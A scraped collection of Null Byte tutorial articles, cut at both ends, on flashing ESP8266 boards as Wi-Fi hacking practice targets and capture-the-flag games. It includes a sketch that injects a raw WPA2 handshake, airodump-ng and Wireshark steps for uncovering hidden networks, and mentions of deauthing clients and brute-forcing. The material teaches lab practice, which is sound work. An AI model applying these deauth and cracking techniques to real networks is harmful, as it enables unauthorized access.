        "content": "* CanaKit Raspberry Pi 4 Starter Kit - 2GB RAM (currently $89.99)\nStep 1: Find Your Board's Serial Port\nTo push the code to your D1 Mini, you'll need to know the serial port on your computer that it's connected to, so plug the board in if you haven't already. In Linux, you can try the following command to try and find its port. You can also grep it to narrow down your search. Below, you can see that I'm connected to ttyUSB3.\n[34156.770688] usb 1-1.2: new full-speed USB device number 16 using ehci-pci\n[34156.881101] usb 1-1.2: New USB device found, idVendor=1a86, idProduct=7523\n[34156.881106] usb 1-1.2: New USB device strings: Mfr=0, Product=2, SerialNumber=0\n[34156.881109] usb 1-1.2: Product: USB2.0-Serial\n[34156.881920] ch341 1-1.2:1.0: ch341-uart converter detected\n[34156.884053] usb 1-1.2: ch341-uart converter now attached to ttyUSB3\nIn macOS, you can try the ls /dev/cu.* command, and in Windows, visit your Device Manager to figure it out. Whichever OS you're using, you need to find the port and be sure that it's the right one. You can usually figure that out by unplugging it and rerunning the search; if it's missing, it's probably it.\nStep 2: Download the ESPtool\nTo push the code to the D1 Mini board, you could use Arduino IDE, which we've covered many times before. But since the binary files are precompiled and don't need to be edited, we can just use ESPtool instead as long as Python is installed. If you've followed our other D1 Mini guides, you more than likely already have it. If not, it's easy to install on Linux:\n~$ sudo apt install esptool\n[sudo] password for nullbyte:\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nesptool is already the newest version (2.8+dfsg-1).\n0 upgraded, 0 newly installed, 0 to remove and 121 not upgraded.\nYou can verify the installation with:\nesptool.py v2.8\nusage: esptool [-h] [--chip {auto,esp8266,esp32}] [--port PORT] [--baud BAUD]\n[--before {default_reset,no_reset,no_reset_no_sync}]\n[--after {hard_reset,soft_reset,no_reset}] [--no-stub]\n[--trace] [--override-vddsdio [{1.8V,1.9V,OFF}]]\n{load_ram,dump_mem,read_mem,write_mem,write_flash,run,image_info,make_image,elf2image,read_mac,chip_id,flash_id,read_flash_status,write_flash_status,read_flash,verify_flash,erase_flash,erase_region,version}\nesptool.py v2.8 - ESP8266 ROM Bootloader Utility\npositional arguments:\n{load_ram,dump_mem,read_mem,write_mem,write_flash,run,image_info,make_image,elf2image,read_mac,chip_id,flash_id,read_flash_status,write_flash_status,read_flash,verify_flash,erase_flash,erase_region,version}\nRun esptool {command} -h for additional help\nload_ram            Download an image to RAM and execute\ndump_mem            Dump arbitrary memory to disk\nread_mem            Read arbitrary memory location\nwrite_mem           Read-modify-write to arbitrary memory location\nwrite_flash         Write a binary blob to flash\nrun                 Run application code in flash\nimage_info          Dump headers from an application image\nmake_image          Create an application image from binary files\nelf2image           Create an application image from ELF file\nread_mac            Read MAC address from OTP ROM\nchip_id             Read Chip ID from OTP ROM\nflash_id            Read SPI flash manufacturer and device ID\nread_flash_status   Read SPI flash status register\nwrite_flash_status  Write SPI flash status register\nread_flash          Read SPI flash content\nverify_flash        Verify a binary blob against flash\nerase_flash         Perform Chip Erase on SPI flash\nerase_region        Erase a region of the flash\nversion             Print esptool version\noptional arguments:\n-h, --help            show this help message and exit\n--chip {auto,esp8266,esp32}, -c {auto,esp8266,esp32}\nTarget chip type\n--port PORT, -p PORT  Serial port device\n--baud BAUD, -b BAUD  Serial port baud rate used when flashing/reading\n--before {default_reset,no_reset,no_reset_no_sync}\nWhat to do before connecting to the chip\n--after {hard_reset,soft_reset,no_reset}, -a {hard_reset,soft_reset,no_reset}\nWhat to do after esptool.py is finished\n--no-stub             Disable launching the flasher stub, only talk to ROM\nbootloader. Some features will not be available.\n--trace, -t           Enable trace-level output of esptool.py interactions.\n--override-vddsdio [{1.8V,1.9V,OFF}]\nOverride ESP32 VDDSDIO internal voltage regulator (use\nThe commands we'll use for each game below follow the same syntax, where \"SERIALPORT\" is your serial port, and \"FILENAME.bin\" is the path to the game file. The -p just means port.\n~$ esptool.py -p SERIALPORT write_flash -fm dout 0x0000 'FILENAME.bin'\nStep 3: Install the Game Files\nYou can get the games from Kody Kinzie's GitHub page. You can download the ZIP from there, but it's easier just to use the git clone command below.\n~$ sudo git clone https://github.com/skickar/esp8266games.git\nCloning into 'esp8266games'...\nremote: Enumerating objects: 18, done.\nremote: Counting objects: 100% (18/18), done.\nremote: Compressing objects: 100% (16/16), done.\nremote: Total 18 (delta 7), reused 0 (delta 0), pack-reused 0\nReceiving objects: 100% (18/18), 415.48 KiB | 2.75 MiB/s, done.\nResolving deltas: 100% (7/7), done.\nThen, change into that directory so we can begin:\n~$ cd esp8266games\n~/esp8266games$\nStep 4: Run the Handshake Injector\nThe first game to cover is the Handshake Injector. To run it, take the ESPtool command mentioned in Step 2, swap out the port with your port (it's ttyUSB3\" for me), and add the path to the HandshakeInjectorD1Mini.bin file. Hit Enter, and it should flash the game to your D1 Mini.\n~/esp8266games$ esptool.py -p /dev/ttyUSB3 write_flash -fm dout 0x0000 '/home/skicka/esp8266games/HandshakeInjectorD1Mini.bin'\nWhen it's done, it should immediately begin broadcasting a handshake that we can listen to in a Wireshark capture, and then we can crack the handshake provided we have the password somewhere in our brute-forcing password list. This is a great way to demonstrate how brute-forcing works, and it only requires a single ESP8266 to practice.\nStep 5: Run the Reactive Target\nThe second thing that we are going to practice is being a client. This means that we don't want to attack an entire network — we just want to attack a single device on a network. To set this up, use the ReactiveTargetD1Mini.bin file in the command.\n~/esp8266games$ esptool.py -p /dev/ttyUSB3 write_flash -fm dout 0x0000 '/home/skicka/esp8266games/ReactiveTargetD1Mini.bin'\nAfter it finishes uploading, we'll need a three-color RGB LED — or three different colored LEDs (red, green, blue) — to indicate the status of this reactive target. Once we have it plugged in, we can determine exactly whether or not we've successfully connected to a Wi-Fi network. If we have, we can see if we are currently being kicked off.\nLet's say that you have a smartphone and you want to generate a Wi-Fi access point. In this case, it's pre-programmed to one called \"Control,\" and the password is \"testytest.\" As soon as it joins that network, it will turn green, and then it'll turn red any time it is being kicked off the network.\nIf something's wrong and it can't find the access point, it'll turn blue, which means it hasn't been able to successfully connect — just to allow you to diagnose when it isn't working, preventing you from having a really frustrating CTF if the device never was able to connect in the first place.\nAnyway, this should allow you to connect to an existing access point. Maybe an access point on your phone, such as a hotspot you're creating. It'll attack the device that's connected to it and see exactly when you are succeeding.\nIt's a great way to teach people how to attack an individual device on a network without taking out any other devices on the network. You can even use a whole bunch of these to make sure that each person is attacking their own target, which will keep the chaos down if you're doing a larger workshop.\nStep 6: Run the WiFi Access Point\nLet's say we want to attack an entire network. We can add the WiFiAccessPoint.bin file to the command, which is a default Arduino script. This will create an access point that the reactive target above will automatically join.\n* Don't Miss: How to Generate Crackable Wi-Fi Handshakes with an ESP8266-Based Test Network\n~/esp8266games$ esptool.py -p /dev/ttyUSB3 write_flash -fm dout 0x0000 '/home/skicka/Downloads/WiFiAccessPoint.bin'\nWe could use one D1 Mini as the reactive target and this D1 Mini as a simple access point to join. We are now free to attack the client and the access point because we know that this is a dummy access point that we will not get in trouble for attacking. Nobody would be influenced or otherwise negatively impacted by us taking down this network.\nTo practice taking down an entire network, check out the available networks in the area. Hopefully, you'll see the one that our test device would automatically connect to. If you see it, you can expect that your reactive target would be automatically connecting to it.\nCheck out our full guide on using test networks to generate crackable Wi-Fi handshakes.\nStep 7: Run the Hidden Network\nNow, let's say we want to do a CTF game where we have a hidden Wi-Fi network. Well, we can do that too using the HiddenNetworkD1Mini.bin file. This is a spin on the access point that we just created where instead of making it visible, the only thing we're really changing is that we can't see it.\n* Don't Miss: There Are Hidden Wi-Fi Networks All Around You — These Attacks Will Find Them\n~/esp8266games$ esptool.py -p /dev/ttyUSB3 write_flash -fm dout 0x0000 '/home/skicka/esp8266games/HiddenNetworkD1Mini.bin'\nAs soon as it's loaded, we shouldn't be able to see this access point anymore. Then, you can try to brute force the AP name. It's a great way to practice tools that will allow us to attack a hidden network. You can see more on creating and finding a hidden network in our full guide.\nStep 8: Run the Chicken Man Game\nIf you have two Raspberry Pis, I highly recommend you check out the Chicken Man Game., which is a Wi-Fi hacking CTF that allows you to use a couple of boards to create both a chicken and a chicken man. The \"chicken\" is a hackable Wi-Fi access point. If you manage to get the password, you'll be able to log in and actually score points.\nThe \"chicken man\" is a game piece that's constantly joining these networks and generating handshakes for you to capture, and it's keeping score of who is in the lead and making sure that whatever team is winning is getting a nice little light show if have some NeoPixels set up.\nTo run it, put the ChickenManGame.bin in the command.\n~/esp8266games$ esptool.py -p /dev/ttyUSB3 write_flash -fm dout 0x0000 '/home/skicka/esp8266games/ChickenManGame.bin'\nOnce it's done loading, you can check to make sure that it's working properly. For example, you can always look at the serial output using screen or Arduino IDE to make sure that it is accurately displaying the information you want. In this case, it should depend on whether it's a chicken or a chicken man, either creating an access point or looking for access points.\nIf you want to change the chicken to a chicken man, and have it actually joining the access points and creating the handshakes, then you'll need to make a small change by connecting the D7 pin to ground.\nAside from that small change, they're virtually the same. So if you've got three boards lying around, you can make two of them into access points that can be hacked, and the third will go ahead and join them as a chicken man, generating handshakes and keeping track of who is in the lead.\nFor more info on the Chicken Man Game, check out its GitHub.\nCheck Out the Video for More Info\nCheck these files out if you're interested in doing an interesting, fun Wi-Fi hacking CTF in your area. It's a great way to get started teaching people about how Wi-Fi is insecure and needs to be fixed without getting in trouble actually breaking into someone else's Wi-Fi yourself.\nWhile the D1 Mini might be small, it can be used by the games we've gone over today to practice deauthing an individual device off the network, crack handshakes, or attack a hidden network. That's pretty cool for such a small price. For more information, make sure to watch the Cyber Weapons Lab video above.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshot by Retia/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "There Are Hidden Wi-Fi Networks All Around You — These Attacks Will Find Them",
        "link": "https://null-byte.wonderhowto.com/how-to/there-are-hidden-wi-fi-networks-all-around-you-these-attacks-will-find-them-0237630/",
        "content": "* WonderHowTo\nThere are hidden Wi-Fi networks all around you — networks that will never show up in the list of available unlocked and password-protected hotspots that your phone or computer can see — but are they more secure than regular networks that broadcast their name to any nearby device?\nThe short answer is no, and that could be for any number of reasons.\nHidden networks are actually the same as regular Wi-Fi networks; only they don't broadcast their names (ESSID) in the beacon frames that regular networks send out. If the name isn't included, your phone or computer will never find it just by scanning for nearby hotspots to join. To join a hidden network, you need to know its name first, and there are a few attacks that can accomplish this.\nThere is no elaborate, crazy attack needed to discover hidden Wi-Fi networks in your area, so virtually anybody that can work their way around a computer can find one. You don't have to be a hacker, pentester, cybersecurity professional, or someone with another type of fancy cyber skillset.\nWays Somebody Can Uncover a Hidden Network\nFor example, you could monitor the phone, computer, or another device of a person who has connected to the hidden network before because their device will be \"screaming out\" the name of the network in plain text. That's because it never knows when it's physically close to the network since the network is not announcing its presence, so it's constantly looking for it.\nYou could also deauthenticate, or deauth, somebody currently connected to the hidden network. Then, when they try to reconnect to the hotspot, you'll be able to intercept the network name. Whether it's this way or the one above, you can use airodump and Wireshark to get the name, as you'll soon see.\nAnother option we'll show you today is attacking the network with MDK3 and brute-forcing the name from a word list. To follow along, you'll need to have a computer, Arduino IDE, Wireshark, and a wireless network card or adapter that can be put into monitor mode.\n* Don't Miss: How to Check if Your Wireless Network Adapter Supports Monitor Mode & Packet Injection\nYou will also need a hidden network to attack. An easy way to do that is to create one yourself, and one good way to do that is with a D1 Mini and Arduino IDE. Check out our full guide on turning a D1 Mini microcontroller into a hackable Wi-Fi network for more info, only we'll be using a different sketch today.\nRecommended D1 Mini: Makerfocus D1 Mini NodeMCU Wi-Fi Development Board Based on ESP8266 ESP-12F ($8.99)\nStep 1: Create a Hidden Network on a D1 Mini (Optional)\nI'll assume you don't have a hidden network to hunt down, so we'll make one with a D1 Mini and Arduino IDE. I won't go into detail on how to set up a D1 Mini with Arduino IDE since we already have manyguidesthatshowhowtodo it, so check one of those out if you don't know how to connect to the D1 Mini.\nConnect your D1 Mini to your computer, then open up the \"WiFiAccessPoint\" example sketch in Arduino IDE. You can find the sketch via File –> Examples –> ESP8266WiFi –> WiFiAccessPoint.\nThis sketch is pretty much good to go — we just need to modify one tiny thing to create a hidden network. Because the example sketch is for creating a visible access point, we need to tweak it a bit. Go to this line in the script:\nWiFi.softAP(ssid, password);\nAnd change it to this:\nWiFi.softAP(ssid, password, 1, 1);\nThe first \"1\" is to set it to channel 1, while the second \"1\" is to say it's a hidden network. The full sketch should look like this now:\nCopyright (c) 2015, Majenko Technologies\nAll rights reserved.\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n* * Redistributions of source code must retain the above copyright notice, this\nlist of conditions and the following disclaimer.\n* * Redistributions in binary form must reproduce the above copyright notice, this\nlist of conditions and the following disclaimer in the documentation and/or\nother materials provided with the distribution.\n* * Neither the name of Majenko Technologies nor the names of its\ncontributors may be used to endorse or promote products derived from\nthis software without specific prior written permission.\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR\nANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON\nANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n/* Create a WiFi access point and provide a web server on it. */\n#include <ESP8266WiFi.h>\n#include <WiFiClient.h>\n#include <ESP8266WebServer.h>\n#ifndef APSSID\n#define APSSID \"ESPap\"\n#define APPSK  \"thereisnospoon\"\n/* Set these to your desired credentials. */\nconst char *ssid = APSSID;\nconst char *password = APPSK;\nESP8266WebServer server(80);\n/* Just a little test message.  Go to http://192.168.4.1 in a web browser\nconnected to this access point to see it.\nvoid handleRoot() {\nserver.send(200, \"text/html\", \"<h1>You are connected</h1>\");\nvoid setup() {\ndelay(1000);\nSerial.begin(115200);\nSerial.println();\nSerial.print(\"Configuring access point...\");\n/* You can remove the password parameter if you want the AP to be open. */\nWiFi.softAP(ssid, password, 1, 1);\nIPAddress myIP = WiFi.softAPIP();\nSerial.print(\"AP IP address: \");\nSerial.println(myIP);\nserver.on(\"/\", handleRoot);\nserver.begin();\nSerial.println(\"HTTP server started\");\nvoid loop() {\nserver.handleClient();\nNow, hit the Upload button to compile the sketch and flash it to the D1 Mini. After it finishes, your D1 Mini should now be broadcasting a hidden access point with the name \"ESPap\" and password \"thereisnospoon\" as seen in the example.\nStep 2: Connect a Device to Your New Hidden Network\nTo see a device hunting for the hidden network, connect to it first with your phone or another device using the default name (ESPap) and password (thereisnospoon). Then, disconnect it from the network. After putting the wireless adapter into monitor mode and doing a quick scan on channel 1, we should be able to the device trying to auto-connect, but more on that in a second.\nStep 3: Put Your Wireless Adapter into Monitor Mode\nPutting your Wi-Fi card or adapter into monitor mode lets you monitor wireless traffic that's not just intended for your computer. Without out, it will only concentrate on what you're allowed to look at, so monitor mode is important for this attack to work. I'll assume you know how to do this, but just in case you don't, check out our full guide on checking and enabling monitor mode.\n* More Info: How to Put Your Wireless Card into Monitor Mode\nStep 4: Scan Channel 1 for Traffic\nWith the card in monitor mode, now it's time to see the channel we'll be listening in on, which would be channel 1, which we included in the example sketch above. This will dramatically narrow down our search. To do so, just use this in a Terminal window:\n~$ sudo airodump-ng CARDNAME -c 1\n[sudo] password:\nAirodump should start scanning now, and if your phone is still on and trying to find the hidden network, you should see it frantically trying to connect to it. It may look like many different devices, but it's actually just one device that's randomizing its MAC address. Look for the wireless destination address.\nIn practice, you could start scanning with airodump, waiting for someone to come home, go into work, or some other scenario where their device will automatically start hunting for the nearby hidden network they've joined before and connect to it. If no other devices in the room have connected to the hidden AP before, it may be obvious which one on the scan is the target, but it could also be tricky if it has a lot of networks saved.\nFor me, airodump has given me a clear indicator of the hidden network. Once you find yours, copy the network device's MAC address, then turn off your phone or disable the Wi-Fi on it.\nStep 5: Open Wireshark\nNow it's time to start eavesdropping on the traffic. Open up Wireshark:\n~$ sudo wireshark\n[sudo] password:\nIt should be capturing packets on the correct channel, but make sure to select the same wireless network adapter that's in monitor mode first. Then, let's use the filter below to narrow down the traffic to just the hidden network.\nwlan.ta == HIDDEN-MAC-ADDRESS",
        "category": "Wifi Hacking"
    },
    {
        "title": "Generate Crackable Wi-Fi Handshakes with an ESP8266-Based Test Network",
        "link": "https://null-byte.wonderhowto.com/how-to/generate-crackable-wi-fi-handshakes-with-esp8266-based-test-network-0236794/",
        "content": "* Organizer ESP8266 ESP-12F D1 Mini (5 Pack) (currently $15.69)\nStep 1: Get the Arduino Sketch\nHead to Kody's Esp8266Wpa2Handshake project on GitHub and download the \"hamshake_injector.ino\" sketch. You could also start a new sketch in Arduino IDE and add the sketch's code below if you don't want to download anything. (Kody created this sketch in collaboration with Spacehuhn.)\n#include <ESP8266WiFi.h>\nextern \"C\" {\n#include \"user_interface.h\"\ntypedef void (*freedom_outside_cb_t)(uint8 status);\nint wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);\nvoid wifi_unregister_send_pkt_freedom_cb(void);\nint wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);\nuint8_t packet0[] = {\n0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff,\n0xff, 0xff, 0xff, 0xda, 0xf1, 0x5b, 0x0c, 0xe2,\n0xff, 0xda, 0xf1, 0x5b, 0x0c, 0xe2, 0xff, 0xd0,\n0x36, 0x8a, 0xf5, 0xd3, 0x04, 0x00, 0x00, 0x00,\n0x00, 0x64, 0x00, 0x11, 0x00, 0x00, 0x04, 0x74,\n0x65, 0x73, 0x74, 0x01, 0x08, 0x8b, 0x96, 0x82,\n0x84, 0x0c, 0x18, 0x30, 0x60, 0x03, 0x01, 0x01,\n0x05, 0x04, 0x00, 0x02, 0x00, 0x00, 0x07, 0x06,\n0x43, 0x4e, 0x00, 0x01, 0x0d, 0x14, 0x32, 0x04,\n0x6c, 0x12, 0x24, 0x48, 0xdd, 0x09, 0x18, 0xfe,\n0x34, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x30,\n0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x02,\n0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac,\n0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00,\nuint8_t packet1[] = {\n0x08, 0x02, 0x3a, 0x01, 0xbc, 0xdd, 0xc2,\n0xb2, 0xc0, 0xab, 0xda, 0xf1, 0x5b, 0x0c, 0xe2,\n0xff, 0xda, 0xf1, 0x5b, 0x0c, 0xe2, 0xff, 0x00,\n0x00, 0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88,\n0x8e, 0x02, 0x03, 0x00, 0x5f, 0x02, 0x00, 0x8a,\n0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x01, 0xa3, 0x16, 0xe8, 0xc7, 0x81, 0xa0,\n0x4f, 0xfe, 0x9d, 0xab, 0x1c, 0x6c, 0xba, 0xc0,\n0xc8, 0xf2, 0x71, 0xce, 0x9f, 0xf4, 0x11, 0x56,\n0xf1, 0x0f, 0x33, 0x5b, 0x31, 0x71, 0xae, 0x8c,\n0xa5, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00\nuint8_t packet2[] = {\n0x08, 0x01, 0x3a, 0x01, 0xda, 0xf1, 0x5b,\n0x0c, 0xe2, 0xff, 0xbc, 0xdd, 0xc2, 0xb2, 0xc0,\n0xab, 0xda, 0xf1, 0x5b, 0x0c, 0xe2, 0xff, 0x00,\n0x00, 0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88,\n0x8e, 0x01, 0x03, 0x00, 0x75, 0x02, 0x01, 0x0a,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x01, 0xdb, 0x6a, 0x19, 0x1d, 0x59, 0x75,\n0xbf, 0x01, 0x0c, 0x7c, 0xb4, 0x41, 0xd6, 0xfb,\n0x2b, 0xcb, 0xf3, 0xf5, 0xfb, 0x21, 0x6b, 0x50,\n0xd8, 0xfb, 0xa6, 0x57, 0xb6, 0xef, 0xc9, 0x1a,\n0x4c, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x23, 0x98, 0xca, 0x33, 0x5e, 0x53,\n0x26, 0x8a, 0x12, 0xe2, 0xea, 0x47, 0xd4, 0x6e,\n0xcb, 0x0f, 0x00, 0x16, 0x30, 0x14, 0x01, 0x00,\n0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f,\n0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,\nuint8_t packet3[] = {\n0x08, 0x02, 0x3a, 0x01, 0xbc, 0xdd, 0xc2,\n0xb2, 0xc0, 0xab, 0xda, 0xf1, 0x5b, 0x0c, 0xe2,\n0xff, 0xda, 0xf1, 0x5b, 0x0c, 0xe2, 0xff, 0x10,\n0x00, 0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88,\n0x8e, 0x02, 0x03, 0x00, 0xaf, 0x02, 0x13, 0xca,\n0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x02, 0xa3, 0x16, 0xe8, 0xc7, 0x81, 0xa0,\n0x4f, 0xfe, 0x9d, 0xab, 0x1c, 0x6c, 0xba, 0xc0,\n0xc8, 0xf2, 0x71, 0xce, 0x9f, 0xf4, 0x11, 0x56,\n0xf1, 0x0f, 0x33, 0x5b, 0x31, 0x71, 0xae, 0x8c,\n0xa5, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x61, 0x40, 0xb2, 0xb8, 0x81, 0xf6,\n0xd2, 0xc0, 0x2f, 0x92, 0x8a, 0x63, 0x36, 0x04,\n0x68, 0xc4, 0x00, 0x50, 0x67, 0x1c, 0x65, 0xee,\n0xc4, 0xba, 0xf0, 0x2d, 0xe9, 0x0e, 0xfe, 0x58,\n0x65, 0x7d, 0xfc, 0xab, 0xe9, 0x8e, 0x99, 0x0f,\n0xcf, 0x04, 0x39, 0x3b, 0x20, 0x3c, 0x17, 0xc6,\n0xec, 0xd9, 0x2a, 0xda, 0x31, 0xa6, 0xd8, 0x42,\n0xfd, 0x66, 0x8e, 0x09, 0x47, 0xeb, 0x0d, 0x1c,\n0x0a, 0x5f, 0x69, 0x47, 0xdf, 0x68, 0xf7, 0xf0,\n0x98, 0xa9, 0xb0, 0x8c, 0xa7, 0x61, 0x45, 0x60,\n0xb2, 0x09, 0xce, 0x99, 0xae, 0xba, 0xb5, 0xea,\n0xba, 0x4c, 0xc0, 0x76, 0xe7, 0x4b, 0x8e, 0x01,\n0x06, 0x9c, 0x9c, 0x43\nuint8_t packet4[] = {\n0x08, 0x01, 0x3a, 0x01, 0xda, 0xf1, 0x5b,\n0x0c, 0xe2, 0xff, 0xbc, 0xdd, 0xc2, 0xb2, 0xc0,\n0xab, 0xda, 0xf1, 0x5b, 0x0c, 0xe2, 0xff, 0x10,\n0x00, 0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88,\n0x8e, 0x01, 0x03, 0x00, 0x5f, 0x02, 0x03, 0x0a,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0xb5, 0x84, 0x9b, 0x18, 0x61, 0x0b,\n0xd3, 0x76, 0x1d, 0x79, 0x21, 0xdd, 0x0a, 0xcf,\n0x2d, 0x00, 0x00, 0x00\nvoid setup() {\nSerial.begin(115200);\nSerial.println();\n// start WiFi\nWiFi.mode(WIFI_OFF);\nwifi_set_opmode(STATION_MODE);\n// set channel\nwifi_set_channel(11);\nvoid loop() {\ni += wifi_send_pkt_freedom(packet0, sizeof(packet0), 0);\ndelay(100);\ni += wifi_send_pkt_freedom(packet1, sizeof(packet1), 0);\ndelay(100);\ni += wifi_send_pkt_freedom(packet2, sizeof(packet2), 0);\ndelay(100);\ni += wifi_send_pkt_freedom(packet3, sizeof(packet3), 0);\ndelay(100);\ni += wifi_send_pkt_freedom(packet4, sizeof(packet4), 0);\ndelay(100);\nSerial.println(i);\ndelay(500);\nStep 2: Add Boards to Arduino\nBefore we can flash the sketch over to the microcontroller, we'll need to make sure we have the correct board installed. Open up the \"Preferences\" in Arduino IDE, then paste the following JSON link in the \"Additional Board Manager URLs\" field. If you already have some board URLs, you can click the expand button to see it better. Paste the following URL on a separate line. Click \"OK,\" then \"OK\" again to close the settings.\n* Don't Miss: Change a Phone's Coordinates by Spoofing Wi-Fi Geolocation Hotspots\nhttps://arduino.esp8266.com/stable/package_esp8266com_index.json\nWhen this is correctly added to Arduino IDE, it will pull down all of the different ESP8266-based boards so that we can select the version we have to set up a line of communication between the software and microcontroller.\nNow, go to \"Tools,\" choose \"Board,\" then \"Boards Manager.\" In the search field, type \"esp8266,\" then install the one by ESP8266 Community. Wait for it to finish installing, then \"Close\" out of the window.\nStep 3: Choose the Right Port\nTo communicate with the ESP8266 board, you need to choose the correct port that it's using to connect. So if you haven't connected your D1 Mini or another type of ESP8266 to your computer, do that now. Make sure you have a good USB data cable. If it's not showing up, try another cable.\nTo find your port in Linux, open a terminal window, and try:\n~$ dmesg | grep tty\n/dev/cu.Bluetooth-Incoming-Port /dev/cu.usbserial-110\n/dev/cu.debug-console       /dev/cu.wlan-debug\nIn macOS, you can try:\n~$ ls /dev/cu.*\n/dev/cu.Bluetooth-Incoming-Port /dev/cu.usbserial-110\n/dev/cu.debug-console       /dev/cu.wlan-debug\nTo verify you have the right device, you can unplug the MCU, rerun the scan, and see which port is missing. Plug it back in, rerun it again, and you should see it pop back up. For me, it's /dev/cu.usbserial-110.\nBack in Arduino IDE, go to \"Tools,\" then \"Port,\" and make sure to select the MCU's port. Then, in \"Tools,\" go back to \"Board,\" but this time select \"ESP8266 Boards.\" These are the boards the link in Step 2 populated. Find and select your microcontroller's model.\nStep 4: Erase the Board\nIf you already used the ESP8266 at some point before, there might be code on it already. In that case, you should use the following to erase the board first. See our other guide for more information on getting and using esptool.py to erase your boards.\n~$ esptool.py --port /dev/cu.wchusbserial14140 erase_flash\nesptool.py v3.0\nSerial port /dev/cu.usbserial-110\nConnecting....\nDetecting chip type... ESP8266\nChip is ESP8266EX\nFeatures: WiFi\nCrystal is 26MHz\nMAC: ██:██:██:██:██:██\nUploading stub...\nRunning stub...\nStub running...\nErasing flash (this may take a while)...\nChip erase completed successfully in 9.0s\nHard resetting via RTS pin...\nStep 5: Set Your Channel\nBefore we compile and flash the sketch, let's look at it. We're going to be transmitting several different packets later, but what are these packets? Well, these are a four-way handshake — all the information we need to try to crack a Wi-Fi password — as well as a beacon frame.\nThat last part is important because the cracking tools we're going to use simply cannot recognize a beacon frame without the network name in it. If it lacks that piece of information, it wouldn't be able to put our password guesses through the algorithm necessary to create the hash to compare them against. So we really need the Wi-Fi network name in the beacon frame, as well as the handshake, to pull this off.\nWhen we compile and flash the sketch to the ESP8266 board a few steps down, we will be broadcasting these packets, but we will have a hard time finding them if we don't know what channel to listen in on. If you look at the sketch, you can see a spot for the channel. I have it as channel 11 since that's the channel for the network I'm connected to, but you can edit this channel now before you upload it to the board. This is so that we'll know where to be listening in for these packets being broadcasted.\nvoid setup() {\nSerial.begin(115200);\nSerial.println();\n// start WiFi\nWiFi.mode(WIFI_OFF);\nwifi_set_opmode(STATION_MODE);\n// set channel\nwifi_set_channel(11);\nStep 6: Compile & Flash the Sketch\nWhen your board is ready to go, in the 